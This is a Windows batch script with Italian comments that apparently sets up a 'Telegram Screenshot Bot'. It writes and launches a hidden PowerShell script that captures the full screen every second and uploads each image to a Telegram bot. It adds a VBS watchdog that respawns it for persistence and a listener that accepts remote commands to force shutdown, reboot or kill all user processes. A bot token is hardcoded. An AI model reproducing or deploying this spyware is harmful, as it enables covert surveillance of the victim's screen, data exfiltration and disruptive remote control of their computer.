@echo off
title Telegram Screenshot Bot
setlocal EnableExtensions EnableDelayedExpansion
cd /d "%~dp0"

:: ============================================
:: CONFIGURAZIONE
:: ============================================
set "BOT_TOKEN=8081045018:AAEO7ajGxYpi23xOl-mY7gYYjGNVwGdSxfM"
set "CHAT_ID=8016989344"
set "OFFSET_FILE=%~dp0last_offset.txt"
set "TMP_JSON=%TEMP%\tg_updates_%RANDOM%.json"
set "TMP_TSV=%TEMP%\tg_parse_%RANDOM%.tsv"
set "SCREENSHOT_INTERVAL=1"

:: ============================================
:: VERIFICA E INSTALLAZIONE jq.exe
:: ============================================
if not exist "%~dp0jq.exe" (
    echo Download jq.exe in corso...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/stedolan/jq/releases/download/jq-1.6/jq-win64.exe' -OutFile '%~dp0jq.exe'"
    if exist "%~dp0jq.exe" (
        echo jq.exe installato con successo.
    ) else (
        echo ERRORE: Impossibile scaricare jq.exe
        pause
        exit /b 1
    )
)

set "JQ=%~dp0jq.exe"

:: ============================================
:: CREAZIONE WATCHDOG VBS (persistenza)
:: ============================================
echo ' Watchdog VBS - Mantiene i processi attivi > "%temp%\tg_watchdog.vbs"
echo Dim WshShell, objWMIService, colProcesses >> "%temp%\tg_watchdog.vbs"
echo Set WshShell = CreateObject("WScript.Shell") >> "%temp%\tg_watchdog.vbs"
echo Set objWMIService = GetObject("winmgmts:\\.\root\cimv2") >> "%temp%\tg_watchdog.vbs"
echo. >> "%temp%\tg_watchdog.vbs"
echo Do While True >> "%temp%\tg_watchdog.vbs"
echo     ' Controlla screenshot_sender >> "%temp%\tg_watchdog.vbs"
echo     Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='powershell.exe' AND CommandLine LIKE '%%screenshot_sender.ps1%%'") >> "%temp%\tg_watchdog.vbs"
echo     If colProcesses.Count = 0 Then >> "%temp%\tg_watchdog.vbs"
echo         WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ ^& "%temp%\screenshot_sender.ps1" ^& """", 0, False >> "%temp%\tg_watchdog.vbs"
echo     End If >> "%temp%\tg_watchdog.vbs"
echo     ' Controlla telegram_listener >> "%temp%\tg_watchdog.vbs"
echo     Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe' AND CommandLine LIKE '%%telegram_listener.bat%%'") >> "%temp%\tg_watchdog.vbs"
echo     If colProcesses.Count = 0 Then >> "%temp%\tg_watchdog.vbs"
echo         WshShell.Run "cmd.exe /c """ ^& "%~f0" ^& """ listener", 0, False >> "%temp%\tg_watchdog.vbs"
echo     End If >> "%temp%\tg_watchdog.vbs"
echo     WScript.Sleep 5000 >> "%temp%\tg_watchdog.vbs"
echo Loop >> "%temp%\tg_watchdog.vbs"

:: ============================================
:: CREAZIONE SCRIPT POWERSHELL PER SCREENSHOT
:: ============================================
echo $botToken = '%BOT_TOKEN%' > "%temp%\screenshot_sender.ps1"
echo $chatId = '%CHAT_ID%' >> "%temp%\screenshot_sender.ps1"
echo $sleepTime = %SCREENSHOT_INTERVAL% >> "%temp%\screenshot_sender.ps1"
echo Add-Type -AssemblyName System.Windows.Forms >> "%temp%\screenshot_sender.ps1"
echo Add-Type -AssemblyName System.Drawing >> "%temp%\screenshot_sender.ps1"
echo. >> "%temp%\screenshot_sender.ps1"
echo while($true) { >> "%temp%\screenshot_sender.ps1"
echo     try { >> "%temp%\screenshot_sender.ps1"
echo         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen >> "%temp%\screenshot_sender.ps1"
echo         $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height) >> "%temp%\screenshot_sender.ps1"
echo         $graphics = [System.Drawing.Graphics]::FromImage($bitmap) >> "%temp%\screenshot_sender.ps1"
echo         $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size) >> "%temp%\screenshot_sender.ps1"
echo         $file = "$env:temp\screenshot_$(Get-Date -f 'yyyyMMdd_HHmmss').jpg" >> "%temp%\screenshot_sender.ps1"
echo         $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Jpeg) >> "%temp%\screenshot_sender.ps1"
echo         $bitmap.Dispose() >> "%temp%\screenshot_sender.ps1"
echo         $graphics.Dispose() >> "%temp%\screenshot_sender.ps1"
echo         curl.exe -s -X POST "https://api.telegram.org/bot$botToken/sendPhoto" -F chat_id=$chatId -F photo=@"$file" >> "%temp%\screenshot_sender.ps1"
echo         Remove-Item "$file" -Force >> "%temp%\screenshot_sender.ps1"
echo     } catch { } >> "%temp%\screenshot_sender.ps1"
echo     Start-Sleep -Seconds $sleepTime >> "%temp%\screenshot_sender.ps1"
echo } >> "%temp%\screenshot_sender.ps1"

:: ============================================
:: CREAZIONE SCRIPT DI SPEGNIMENTO ISTANTANEO
:: ============================================
:: Metodo 1: Shutdown forzato immediato
(
echo @echo off
echo shutdown /s /f /t 0
) > "%temp%\shutdown_now.bat"

:: Metodo 2: Comando diretto per spegnimento istantaneo
(
echo @echo off
echo echo Spegnimento immediato...
echo rundll32.exe powrprof.dll,SetSuspendState 0,1,0
) > "%temp%\shutdown_force.bat"

:: Metodo 3: Kill processi e spegnimento (più drastico)
(
echo @echo off
echo taskkill /F /FI "USERNAME eq %username%" /IM * 2^>nul
echo shutdown /s /f /t 0
) > "%temp%\shutdown_kill.bat"

:: ============================================
:: SE ARGOMENTO "listener" AVVIA SOLO IL LISTENER
:: ============================================
if "%1"=="listener" goto :listener_only

:: ============================================
:: AVVIO PRINCIPALE
:: ============================================
echo ============================================
echo    TELEGRAM SCREENSHOT BOT
echo ============================================
echo.
echo Avvio sistema completo...
echo.

:: Avvia watchdog
start /B wscript.exe //nologo "%temp%\tg_watchdog.vbs"

:: Avvia screenshot sender
start /B powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\screenshot_sender.ps1"

:: Avvia listener in questa finestra
goto :listener_only

:: ============================================
:: LISTENER TELEGRAM CON POPUP
:: ============================================
:listener_only
echo [LISTENER] In ascolto messaggi...
echo.

:: Inizializza offset
set "OFFSET=0"
if exist "%OFFSET_FILE%" set /p OFFSET=<"%OFFSET_FILE%"
set /a OFFSET=OFFSET+0 >nul 2>&1
if errorlevel 1 set "OFFSET=0"

:: Sincronizza offset iniziale
curl.exe -s -G "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" --data-urlencode "offset=%OFFSET%" --data-urlencode "timeout=1" > "%TMP_JSON%" 2>nul
for /f %%U in ('"%JQ%" -r ".result[-1].update_id // empty" "%TMP_JSON%" 2^>nul') do set /a OFFSET=%%U+1
> "%OFFSET_FILE%" echo !OFFSET!
attrib +h "%OFFSET_FILE%" >nul 2>&1

:listen_loop
curl.exe -s -G "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" --data-urlencode "offset=%OFFSET%" --data-urlencode "timeout=10" > "%TMP_JSON%" 2>nul
if errorlevel 1 (
    timeout /t 2 /nobreak >nul
    goto :listen_loop
)

"%JQ%" -r ".result[]? | [(.update_id|tostring), ((.message.text // .edited_message.text // .callback_query.data // .message.caption // .edited_message.caption // \"\")|gsub(\"[\r\n]+\"; \" \"))] | @tsv" "%TMP_JSON%" > "%TMP_TSV%" 2>nul
if errorlevel 1 (
    timeout /t 2 /nobreak >nul
    goto :listen_loop
)

for /f "usebackq tokens=1,* delims=	" %%A in ("%TMP_TSV%") do (
    set "UPD=%%A"
    set "TEXT=%%B"
    
    :: MOSTRA POPUP PER OGNI MESSAGGIO RICEVUTO
    echo Mostra popup per: !TEXT!
    powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Messaggio ricevuto da Telegram:' + [Environment]::NewLine + [Environment]::NewLine + '!TEXT!', 'Nuovo Messaggio', 'OK', 'Information') | Out-Null"
    
    :: Elaborazione comandi
    if /i "!TEXT!"=="/stop" (
        echo [COMANDO] Stop ricevuto, arresto sistema...
        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Arresto del bot in corso...', 'Stop', 'OK', 'Warning') | Out-Null"
        taskkill /F /IM wscript.exe /FI "WINDOWTITLE eq *tg_watchdog*" 2>nul
        taskkill /F /IM powershell.exe /FI "COMMANDLINE like *screenshot_sender*" 2>nul
        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="Bot arrestato"
        exit
    )
    
    if /i "!TEXT!"=="/off" (
        echo [COMANDO] Spegnimento immediato richiesto...
        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('SPEGNIMENTO IMMEDIATO DEL COMPUTER!', 'SHUTDOWN', 'OK', 'Error') | Out-Null"
        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="🔴 SPEGNIMENTO IMMEDIATO 🔴 Il computer si spegnerà ora."
        
        :: Spegnimento istantaneo con metodo diretto
        start /B cmd.exe /c "shutdown /s /f /t 0"
        
        :: Backup: se shutdown fallisce, usa metodo alternativo
        timeout /t 1 /nobreak >nul
        start /B cmd.exe /c "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"
        
        :: Backup finale: kill processi e spegni
        timeout /t 1 /nobreak >nul
        start /B cmd.exe /c "taskkill /F /IM explorer.exe & shutdown /s /f /t 0"
        
        exit
    )
    
    if /i "!TEXT!"=="/off2" (
        echo [COMANDO] Spegnimento forzato con kill processi...
        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('KILL ALL PROCESS + SHUTDOWN', 'SHUTDOWN', 'OK', 'Error') | Out-Null"
        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="💀 KILL ALL + SHUTDOWN 💀"
        
        :: Uccidi tutti i processi dell'utente e spegni
        start /B cmd.exe /c "for /f ""skip=3"" %i in ('tasklist /FI ""USERNAME eq %username%"" /NH') do taskkill /F /PID %i 2>nul & shutdown /s /f /t 0"
        exit
    )
    
    if /i "!TEXT!"=="/reboot" (
        echo [COMANDO] Riavvio immediato...
        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('RIAVVIO IMMEDIATO!', 'REBOOT', 'OK', 'Warning') | Out-Null"
        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="🔄 RIAVVIO IMMEDIATO 🔄"
        start /B cmd.exe /c "shutdown /r /f /t 0"
        exit
    )
    
    if /i "!TEXT!"=="/status" (
        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="Bot attivo. Screenshot ogni %SCREENSHOT_INTERVAL% secondo."
        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Bot attivo' + [Environment]::NewLine + 'Screenshot ogni %SCREENSHOT_INTERVAL% secondo', 'Status', 'OK', 'Information') | Out-Null"
    )
    
    if /i "!TEXT!"=="/help" (
        curl.exe -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" -d chat_id=%CHAT_ID% -d text="Comandi disponibili: /stop - Arresta bot /off - Spegni PC /off2 - Spegni PC kill processi /reboot - Riavvia PC /status - Stato /help - Aiuto"
        powershell -NoProfile -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Comandi:' + [Environment]::NewLine + '/stop - Arresta bot' + [Environment]::NewLine + '/off - Spegni PC' + [Environment]::NewLine + '/off2 - Spegni PC (kill all)' + [Environment]::NewLine + '/reboot - Riavvia PC' + [Environment]::NewLine + '/status - Stato' + [Environment]::NewLine + '/help - Aiuto', 'Help', 'OK', 'Information') | Out-Null"
    )
    
    :: Aggiorna offset
    set /a OFFSET=!UPD!+1
    > "%OFFSET_FILE%" echo !OFFSET!
    attrib +h "%OFFSET_FILE%" >nul 2>&1
)

timeout /t 1 /nobreak >nul
goto :listen_loop
